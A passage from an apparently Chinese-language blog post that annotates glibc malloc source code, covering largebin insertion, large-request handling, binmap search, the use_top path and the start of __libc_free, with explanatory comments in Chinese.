below */</span><br>                <span class="hljs-comment">//如果不是在main_arena呢?看来还是得学一学线程</span><br>                assert(chunk_main_arena(bck-&gt;bk));<br>                <span class="hljs-comment">//chunksize_nomask()直接取出size段, 不用位运算, 所以说speed comparison</span><br>                <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(size) &lt; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)chunksize_nomask(bck-&gt;bk))<br>                &#123;<span class="hljs-comment">//victim的size小于largebin尾部(bck-&gt;bk)的最小chunk</span><br>                   <span class="hljs-comment">// 令 fwd 指向 large bin 头</span><br>                    fwd = bck;<br>                    <span class="hljs-comment">// 令 bck 指向 largin bin 尾部 chunk</span><br>                    bck = bck-&gt;bk;<br>                    <span class="hljs-comment">// victim 的 fd_nextsize 指向 largin bin 的第一个 chunk</span><br>                    victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                    <span class="hljs-comment">// victim 的 bk_nextsize 指向原来链表的第一个 chunk 指向的 bk_nextsize</span><br>                    <span class="hljs-comment">//原来链表的第一个 chunk 指向的 bk_nextsize是原来最小的(chunk A),</span><br>                    <span class="hljs-comment">//因为这时victim比A小, 所以victim的bk_nextsize肯定是A</span><br>                    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                    <span class="hljs-comment">// 原来链表的第一个 chunk 的 bk_nextsize 指向 victim</span><br>                    <span class="hljs-comment">// 原来指向链表第一个 chunk 的 fd_nextsize 指向 victim</span><br>                    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim<br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                        <span class="hljs-comment">// 当前要插入的 victim 的大小大于最小的 chunk</span><br>                        <span class="hljs-comment">// 判断 fwd 是否在 main arena</span><br>                        assert(chunk_main_arena(fwd));<br>                        <span class="hljs-comment">// 从链表头部开始找到不比 victim 大的 chunk</span><br>                        <span class="hljs-keyword">while</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) size &lt; chunksize_nomask(fwd)) &#123;<br>                            fwd = fwd-&gt;fd_nextsize;<br>                            assert(chunk_main_arena(fwd));<br>                        &#125;<br>                        <span class="hljs-comment">// 如果找到了一个和 victim 一样大的 chunk，</span><br>                        <span class="hljs-comment">// 那就直接将 chunk 插入到该chunk的后面，并不修改 nextsize 指针。</span><br>                        <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) size ==<br>                            (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) chunksize_nomask(fwd))<br>                            <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                            fwd = fwd-&gt;fd;<br>                        <span class="hljs-keyword">else</span> &#123;<br>                            <span class="hljs-comment">// 如果找到的chunk和当前victim大小不一样</span><br><span class="hljs-comment">//就需要构造 nextsize 双向链表,victim指向fwd和后一个(A),A的fd_next指向victim,fwd的bk_next指向victim(最后一行)</span><br>                            <span class="hljs-comment">// 这段真的妙, 我自己写估计得调试出好几个版本</span><br>                            victim-&gt;fd_nextsize              = fwd;<br>                            victim-&gt;bk_nextsize              = fwd-&gt;bk_nextsize;<br>                            fwd-&gt;bk_nextsize                 = victim;<br>                            victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                        &#125;<br>                        bck = fwd-&gt;bk;<span class="hljs-comment">//</span><br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-comment">//如果largebin是空的,fd_next和bk_next都指向自己就可以了</span><br>                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>        &#125;<br>   <span class="hljs-comment">//完成victim的fd和bk指针的修改, 形成fwd--&gt;victim--&gt;bck</span><br>        mark_bin(av, victim_index);<br>        victim-&gt;bk = bck;<br>        victim-&gt;fd = fwd;<span class="hljs-comment">//以上两行将victim插入到相应的链表头部中</span><br>        fwd-&gt;bk = victim;<br>        bck-&gt;fd = victim;<span class="hljs-comment">//修改bck的fd指向victim, fwd(即现在的第二个chunk)的bk指向victim</span><br></code></pre></div></td></tr></table></figure><h4 id="判断iters-大循环结尾"><a href="#判断iters-大循环结尾" class="headerlink" title="判断iters(大循环结尾)"></a>判断iters(大循环结尾)</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>        <span class="hljs-comment">/* If we&#x27;ve processed as many chunks as we&#x27;re allowed while</span><br><span class="hljs-comment"> filling the cache, return one of the cached ones.  */</span><br>        ++tcache_unsorted_count;<br>        <span class="hljs-keyword">if</span> (return_cached &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="hljs-number">0</span> &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)<br>        &#123;<br>            <span class="hljs-keyword">return</span> tcache_get(tc_idx);<br>        &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_ITERS 10000</span><br>        <span class="hljs-keyword">if</span> (++iters &gt;= MAX_ITERS)<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<span class="hljs-comment">//unsorted大循环结束, 避免花费过多时间在unsortedbin的处理上</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>    <span class="hljs-comment">/* If all the small chunks we found ended up cached, return one now.  */</span><br>    <span class="hljs-keyword">if</span> (return_cached)<br>    &#123;<br>        <span class="hljs-keyword">return</span> tcache_get(tc_idx);<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br></code></pre></div></td></tr></table></figure><h3 id="large-request"><a href="#large-request" class="headerlink" title="large request"></a><u>large request</u></h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">   <span class="hljs-comment">/*</span><br><span class="hljs-comment">        If a large request, scan through the chunks of current bin in</span><br><span class="hljs-comment">        sorted order to find smallest that fits.  Use the skip list for this.</span><br><span class="hljs-comment">      */</span><br><span class="hljs-comment">//回想一下, 循环之前判断了fastbin和smallbin, 到largebin的时候先malloc_consolidate清理fastbin到unsortedbin,</span><br><span class="hljs-comment">//从unsortedbin中一个个取出,历经last_remainer,exact fit和放入相应bin中后, 循环中只判断了从unsortedbin中取出的块</span><br><span class="hljs-comment">//即合并之后的chunk,并且没有一块和nb相等.由于smallbin每个bin大小一致,也就是说两次比较smallbin中都没有合适的chunk,</span><br><span class="hljs-comment">//跳出循环之后直接找 *largechunk* 里的即可, 并且是find smallest that fits, 不一定要刚刚好</span><br>   <span class="hljs-keyword">if</span> (!in_smallbin_range(nb))<br>   &#123;<br>       bin = bin_at(av, idx); <span class="hljs-comment">//idx是nb定位出来的idx,在大循环之前,到这里说明是largebin_idx</span><br><br>       <span class="hljs-comment">/* skip scan if empty or largest chunk is too small */</span><br>       <span class="hljs-keyword">if</span> ((victim = first(bin)) != bin &amp;&amp; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)chunksize_nomask(victim) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(nb))<br>       &#123;<span class="hljs-comment">//如果该largebin非空 且 最大的不小于nb</span><br>           <span class="hljs-comment">//为了反向遍历,victim指向最后一个最小的largechunk</span><br>           victim = victim-&gt;bk_nextsize;<br>           <span class="hljs-comment">//找出第一个不小于nb的块, 并且赋值size为这个chunk的大小</span><br>           <span class="hljs-comment">//如果有多个相同大小的chunk, victim会定位到第一个有fd_nextsize指针的chunk</span><br>           <span class="hljs-keyword">while</span> (((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(size = chunksize(victim)) &lt;(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(nb)))<br>               victim = victim-&gt;bk_nextsize;<br><br>           <span class="hljs-comment">//如果从largebin链表中选取的victim不是链表中的最后一个chunk,并且与victim大小相同的chunk不止一个</span><br>           <span class="hljs-comment">//意味着victim为chunk size链表中的节点</span><br>           <span class="hljs-comment">//为了避免调整chunksize链表, 将victim的fd作为候选chunk</span><br>           <span class="hljs-keyword">if</span> (victim != last(bin) &amp;&amp; chunksize_nomask(victim) == chunksize_nomask(victim-&gt;fd))<br>               victim = victim-&gt;fd;<br>           <br>   <span class="hljs-comment">//准备分割,unlink取出victim</span><br>           remainder_size = size - nb;<br>           unlink(av, victim, bck, fwd);<br><br>           <span class="hljs-comment">/* Exhaust */</span><br>           <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE)<br>           &#123;<span class="hljs-comment">//如果剩下的小于MINSIZE就把整个victim给出去</span><br>               <span class="hljs-comment">//例行设置inuse_bit和non_main_arena_bit</span><br>               set_inuse_bit_at_offset(victim, size);<br>               <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                   set_non_main_arena(victim);<br>           &#125;<br>           <span class="hljs-comment">/* Split */</span><br>           <span class="hljs-keyword">else</span><span class="hljs-comment">//如果过大就要分割</span><br>           &#123;<br>               remainder = chunk_at_offset(victim, nb);<span class="hljs-comment">//取出剩下的chunk指针, 前面写过相关过程</span><br>               <span class="hljs-comment">/* We cannot assume the unsorted list is empty and therefore</span><br><span class="hljs-comment">                    have to perform a complete insert here.  */</span><br>               <span class="hljs-comment">//插入unsortedbin头部</span><br>               bck = unsorted_chunks(av);<br>               fwd = bck-&gt;fd;<br>               <span class="hljs-keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))<br>               &#123;<span class="hljs-comment">//简单的检查,防止fwd被篡改</span><br>                   errstr = <span class="hljs-string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;<br>                   <span class="hljs-keyword">goto</span> errout;<br>               &#125;<br>               remainder-&gt;bk = bck;<br>               remainder-&gt;fd = fwd;<br>               bck-&gt;fd = remainder;<br>               fwd-&gt;bk = remainder;<span class="hljs-comment">//插入完成</span><br>               <span class="hljs-keyword">if</span> (!in_smallbin_range(remainder_size))<br>               &#123;<span class="hljs-comment">//largebin就设置一下</span><br>                   remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                   remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>               &#125;<br>               set_head(victim, nb | PREV_INUSE |<br>                                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>               set_head(remainder, remainder_size | PREV_INUSE);<br>               set_foot(remainder, remainder_size);<br>           &#125;<br>           <span class="hljs-comment">//详细的检查, 只有在MALLOC_DEBUG为1时启用</span><br>           check_malloced_chunk(av, victim, nb);<br>           <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>           alloc_perturb(p, bytes);<br>           <span class="hljs-keyword">return</span> p;<br>       &#125;<br>   &#125;<br></code></pre></div></td></tr></table></figure><h3 id="Search-for-next-largest-bin"><a href="#Search-for-next-largest-bin" class="headerlink" title="Search for next largest bin"></a>Search for next largest bin</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">   <span class="hljs-comment">/*</span><br><span class="hljs-comment">        Search for a chunk by scanning bins, starting with next largest</span><br><span class="hljs-comment">        bin. This search is strictly by best-fit; i.e., the smallest</span><br><span class="hljs-comment">        (with ties going to approximately the least recently used) chunk</span><br><span class="hljs-comment">        that fits is selected.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        The bitmap avoids needing to check that most blocks are nonempty.</span><br><span class="hljs-comment">        The particular case of skipping all bins during warm-up phases</span><br><span class="hljs-comment">        when no chunks have been returned yet is faster than it might look.</span><br><span class="hljs-comment">      */</span><br><span class="hljs-comment">//fastbin,smallbin中刚好的--&gt;fastbin合并后+unsortedbin中刚好的--&gt;用nb定位的largebin_idx中不小于的</span><br><span class="hljs-comment">//以上这些全部失败之后进行下面的操作,寻找比当前idx更大的idx</span><br>   ++idx;<span class="hljs-comment">//直接+1</span><br>   bin = bin_at(av, idx);<br><span class="hljs-comment">//使用bitmap能够避免循环判断+1后的idx指向的链表是不是空的</span><br><span class="hljs-comment">//除了mark_bin unmark_bin get_binmap其他binmap函数都不涉及 binmap数组, 只是单纯的移位运算</span><br>   block = idx2block(idx);<span class="hljs-comment">//算出block</span><br>   <span class="hljs-built_in">map</span> = av-&gt;binmap[block];<span class="hljs-comment">//取出map</span><br>   bit = idx2bit(idx);<span class="hljs-comment">//算出该位的bit</span><br><br>   <span class="hljs-keyword">for</span> (;;)<br>   &#123;<span class="hljs-comment">//大循环,找到后 or 没有--&gt;(goto use_top)</span><br>       <span class="hljs-comment">/* Skip rest of block if there are no more set bits in this block.  */</span><br>       <span class="hljs-comment">//Skip rest of block if there are no more set bits in this block.</span><br>       <span class="hljs-keyword">if</span> (bit &gt; <span class="hljs-built_in">map</span> || bit == <span class="hljs-number">0</span>)<br>       &#123;<span class="hljs-comment">//当前bit为0 或者 chunk后面的bit也等于0(bit &gt; map), idx2bit()不可能得到0,应该是循环下面的部分</span><br>           <span class="hljs-keyword">do</span><br>           &#123;<br>               <span class="hljs-keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="hljs-comment">/* out of bins */</span><br>                   <span class="hljs-keyword">goto</span> use_top;<span class="hljs-comment">//没有的话只能够使用top chunk了</span><br>           &#125; <span class="hljs-keyword">while</span> ((<span class="hljs-built_in">map</span> = av-&gt;binmap[block]) == <span class="hljs-number">0</span>);<span class="hljs-comment">//不等零</span><br><br>           bin = bin_at(av, (block &lt;&lt; BINMAPSHIFT));<span class="hljs-comment">//取到了更大且非空的bin</span><br>           bit = <span class="hljs-number">1</span>;<br>       &#125;<br><br>       <span class="hljs-comment">/* Advance to bin with set bit. There must be one. */</span><br>       <span class="hljs-comment">//1.没有经过上面的if,原map中就大于等于bit, 从原bit位开始左移</span><br>       <span class="hljs-comment">//2.经过了上面的if,bit从最低位开始左移</span><br>       <span class="hljs-comment">//从bit位开始找bin header, 肯定是存在的</span><br>       <span class="hljs-keyword">while</span> ((bit &amp; <span class="hljs-built_in">map</span>) == <span class="hljs-number">0</span>)<br>       &#123;<br>           bin = next_bin(bin);<br>           bit &lt;&lt;= <span class="hljs-number">1</span>;<br>           assert(bit != <span class="hljs-number">0</span>);<br>       &#125;<br><br>       <span class="hljs-comment">/* Inspect the bin. It is likely to be non-empty */</span><br>       <span class="hljs-comment">//既然比nb都大, 就选一个最右边的, 这样在largebin中还是最小的</span><br>       victim = last(bin);<br><br>       <span class="hljs-comment">/*  If a false alarm (empty bin), clear the bit. */</span><br>       <span class="hljs-comment">// 如果victim=bin，那么我们就将map对应的位清0，然后获取下一个bin</span><br>       <span class="hljs-comment">// 这种情况发生的概率应该很小。</span><br>       <span class="hljs-keyword">if</span> (victim == bin)<br>       &#123;<br>           av-&gt;binmap[block] = <span class="hljs-built_in">map</span> &amp;= ~bit; <span class="hljs-comment">/* Write through */</span><br>           bin = next_bin(bin);<br>           bit &lt;&lt;= <span class="hljs-number">1</span>;<br>       &#125;<br>       <span class="hljs-keyword">else</span><br>       &#123;<br>           size = chunksize(victim);<br><br>           <span class="hljs-comment">/*  We know the first chunk in this bin is big enough to use. */</span><br>           assert((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(size) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(nb));<br>           <br>           remainder_size = size - nb;<br><br>           <span class="hljs-comment">/* unlink */</span><br>           unlink(av, victim, bck, fwd);<br><br>           <span class="hljs-comment">/* Exhaust */</span><br>           <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE)<br>           &#123;<span class="hljs-comment">//不够就整块送出去</span><br>               set_inuse_bit_at_offset(victim, size);<br>               <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                   set_non_main_arena(victim);<br>           &#125;<br>           <span class="hljs-comment">/* Split */</span><br>           <span class="hljs-keyword">else</span><br>           &#123;<span class="hljs-comment">//够了就分割</span><br>               remainder = chunk_at_offset(victim, nb);<br><br>               <span class="hljs-comment">/* We cannot assume the unsorted list is empty and therefore</span><br><span class="hljs-comment">                    have to perform a complete insert here.  */</span><br>               bck = unsorted_chunks(av);<br>               fwd = bck-&gt;fd;<br>               <span class="hljs-keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))<br>               &#123;<br>                   errstr = <span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;<br>                   <span class="hljs-keyword">goto</span> errout;<br>               &#125;<br>               remainder-&gt;bk = bck;<br>               remainder-&gt;fd = fwd;<br>               bck-&gt;fd = remainder;<br>               fwd-&gt;bk = remainder;<br><br>               <span class="hljs-comment">/* advertise as last remainder */</span><br>               <span class="hljs-comment">// 如果在small bin范围内，就将其标记为remainder</span><br>               <span class="hljs-keyword">if</span> (in_smallbin_range(nb))<br>                   av-&gt;last_remainder = remainder;<br>               <span class="hljs-keyword">if</span> (!in_smallbin_range(remainder_size))<br>               &#123;<br>                   remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                   remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>               &#125;<br>               set_head(victim, nb | PREV_INUSE |<br>                                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>               set_head(remainder, remainder_size | PREV_INUSE);<br>               set_foot(remainder, remainder_size);<br>           &#125;<br>           <span class="hljs-comment">//详细的检查, 只有在MALLOC_DEBUG为1时启用</span><br>           check_malloced_chunk(av, victim, nb);<br>           <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>           alloc_perturb(p, bytes);<br>           <span class="hljs-keyword">return</span> p;<br>       &#125;<br>   &#125;<br></code></pre></div></td></tr></table></figure><h3 id="use-top"><a href="#use-top" class="headerlink" title="use_top"></a>use_top</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">use_top:<br>    <span class="hljs-comment">/*   没看懂写了啥(replenished,fenceposts)</span><br><span class="hljs-comment">         If large enough, split off the chunk bordering the end of memory</span><br><span class="hljs-comment">         (held in av-&gt;top). Note that this is in accord with the best-fit</span><br><span class="hljs-comment">         search rule.  In effect, av-&gt;top is treated as larger (and thus</span><br><span class="hljs-comment">         less well fitting) than any other available chunk since it can</span><br><span class="hljs-comment">         be extended to be as large as necessary (up to system</span><br><span class="hljs-comment">         limitations).</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">         We require that av-&gt;top always exists (i.e., has size &gt;=</span><br><span class="hljs-comment">         MINSIZE) after initialization, so if it would otherwise be</span><br><span class="hljs-comment">         exhausted by current request, it is replenished. (The main</span><br><span class="hljs-comment">         reason for ensuring it exists is that we may need MINSIZE space</span><br><span class="hljs-comment">         to put in fenceposts in sysmalloc.)</span><br><span class="hljs-comment">       */</span><br><br>    victim = av-&gt;top;<br>    size = chunksize(victim);<br><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(size) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(nb + MINSIZE))<br>    &#123;<span class="hljs-comment">//如果top足够大, 就分割</span><br>        remainder_size = size - nb;<br>        remainder = chunk_at_offset(victim, nb);<br>        av-&gt;top = remainder;<br>        set_head(victim, nb | PREV_INUSE |<br>                             (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>        set_head(remainder, remainder_size | PREV_INUSE);<br><span class="hljs-comment">//详细的检查, 只有在MALLOC_DEBUG为1时启用</span><br>        check_malloced_chunk(av, victim, nb);<br>        <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>        alloc_perturb(p, bytes);<br>        <span class="hljs-keyword">return</span> p;<br>    &#125;<br>    <span class="hljs-comment">/* When we are using atomic ops to free fast chunks we can get</span><br><span class="hljs-comment">         here for all block sizes.  */</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (have_fastchunks(av))<br>    &#123;<span class="hljs-comment">//如果不够大且当前arena有fastchunk, 再次malloc_consolidate()等待下一次循环是否可行</span><br>        malloc_consolidate(av);<br>        <span class="hljs-comment">/* restore original bin index */</span><br>        <span class="hljs-keyword">if</span> (in_smallbin_range(nb))<br>            idx = smallbin_index(nb);<br>        <span class="hljs-keyword">else</span><br>            idx = largebin_index(nb);<br>    &#125;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">         Otherwise, relay to handle system-dependent cases</span><br><span class="hljs-comment">       */</span><br>    <span class="hljs-keyword">else</span><br>    &#123;<span class="hljs-comment">//啥都没有, 直接sysmalloc()增加topchunk,并且return跳出循环</span><br>        <span class="hljs-keyword">void</span> *p = sysmalloc(nb, av);<br>        <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>            alloc_perturb(p, bytes);<br>        <span class="hljs-keyword">return</span> p;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h1 id="释放内存块"><a href="#释放内存块" class="headerlink" title="释放内存块"></a>释放内存块</h1><h2 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free"></a>__libc_free</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">void</span> __libc_free(<span class="hljs-keyword">void</span> *mem) &#123;<br>    mstate    ar_ptr;<br>    mchunkptr p; <span class="hljs-comment">/* chunk corresponding to mem */</span><br>    <span class="hljs-comment">// 判断是否有钩子函数 __free_hook</span><br>    <span class="hljs-keyword">void</span> (*hook)(<span class="hljs-keyword">void</span> *, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *) = atomic_forced_read(__free_hook);<br>    <span class="hljs-keyword">if</span> (__builtin_expect(hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>)) &#123;<br>        (*hook)(mem, RETURN_ADDRESS(<span class="hljs-number">0</span>));<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">// free NULL没有作用</span><br>    <span class="hljs-keyword">if</span> (mem == <span class="hljs-number">0</span>) <span class="hljs-comment">/* free(0) has no effect */</span><br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-comment">// 将mem转换为chunk状态</span><br>    p = mem2chunk(mem);<br>    <span class="hljs-comment">// 如果该块内存是mmap得到的</span><br>    <span class="hljs-keyword">if</span> (chunk_is_mmapped(p)) <span class="hljs-comment">/* release mmapped memory. */</span><br>    &#123;<br>        <span class="hljs-comment">/* See if the dynamic brk/mmap threshold needs adjusting.</span><br><span class="hljs-comment">       Dumped fake mmapped chunks 